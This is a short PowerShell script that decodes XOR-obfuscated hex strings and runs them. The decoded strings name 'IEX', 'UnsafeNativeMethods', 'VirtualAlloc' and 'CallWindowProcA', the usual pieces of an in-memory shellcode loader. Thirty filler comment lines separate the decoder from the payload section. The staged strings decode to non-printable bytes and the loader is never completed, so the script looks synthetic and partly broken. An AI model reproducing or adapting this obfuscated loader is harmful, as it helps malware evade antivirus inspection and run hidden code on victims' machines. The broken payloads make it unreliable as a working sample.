Function DecHex([String]$s) {
  $b = New-Object byte[] ($s.Length / 2)
  For ($i = 0; $i -lt $s.Length; $i += 2) {
    $h = $s.Substring($i, 2)
    $b[$i/2] = [convert]::ToByte($h, 16)
    $b[$i/2] = ($b[$i/2] -bxor 255)
  }
  [String][System.Text.Encoding]::ASCII.GetString($b)
}
# Pad01 alpha bravo charlie delta echo foxtrot golf hotel india
# Pad02 alpha bravo charlie delta echo foxtrot golf hotel india
# Pad03 alpha bravo charlie delta echo foxtrot golf hotel india
# Pad04 alpha bravo charlie delta echo foxtrot golf hotel india
# Pad05 alpha bravo charlie delta echo foxtrot golf hotel india
# Pad06 alpha bravo charlie delta echo foxtrot golf hotel india
# Pad07 alpha bravo charlie delta echo foxtrot golf hotel india
# Pad08 alpha bravo charlie delta echo foxtrot golf hotel india
# Pad09 alpha bravo charlie delta echo foxtrot golf hotel india
# Pad10 alpha bravo charlie delta echo foxtrot golf hotel india
# Pad11 alpha bravo charlie delta echo foxtrot golf hotel india
# Pad12 alpha bravo charlie delta echo foxtrot golf hotel india
# Pad13 alpha bravo charlie delta echo foxtrot golf hotel india
# Pad14 alpha bravo charlie delta echo foxtrot golf hotel india
# Pad15 alpha bravo charlie delta echo foxtrot golf hotel india
# Pad16 alpha bravo charlie delta echo foxtrot golf hotel india
# Pad17 alpha bravo charlie delta echo foxtrot golf hotel india
# Pad18 alpha bravo charlie delta echo foxtrot golf hotel india
# Pad19 alpha bravo charlie delta echo foxtrot golf hotel india
# Pad20 alpha bravo charlie delta echo foxtrot golf hotel india
# Pad21 alpha bravo charlie delta echo foxtrot golf hotel india
# Pad22 alpha bravo charlie delta echo foxtrot golf hotel india
# Pad23 alpha bravo charlie delta echo foxtrot golf hotel india
# Pad24 alpha bravo charlie delta echo foxtrot golf hotel india
# Pad25 alpha bravo charlie delta echo foxtrot golf hotel india
# Pad26 alpha bravo charlie delta echo foxtrot golf hotel india
# Pad27 alpha bravo charlie delta echo foxtrot golf hotel india
# Pad28 alpha bravo charlie delta echo foxtrot golf hotel india
# Pad29 alpha bravo charlie delta echo foxtrot golf hotel india
# Pad30 alpha bravo charlie delta echo foxtrot golf hotel india
$c = DecHex 'B6BAA7'
$t = DecHex 'B2969C8D908C90998BD1A89691CCCDD1AA918C9E999AB19E8B96899AB29A8B97909B8C'
$va = DecHex 'A9968D8B8A9E93BE9393909C'
$cw = DecHex 'BC9E9393A896919B9088AF8D909CBE'
$s1 = DecHex '4A4B4C4D4E4F5051'
$s2 = DecHex '4A4B4C4D4E4F5052'
$s3 = DecHex '4A4B4C4D4E4F5053'
$s4 = DecHex '4A4B4C4D4E4F5054'
$s5 = DecHex '4A4B4C4D4E4F5055'
$s6 = DecHex '4A4B4C4D4E4F5056'
$s7 = DecHex '4A4B4C4D4E4F5057'
$s8 = DecHex '4A4B4C4D4E4F5058'
.($c) $s1
.($c) $s2
.($c) $s3
.($c) $s4
.($c) $s5
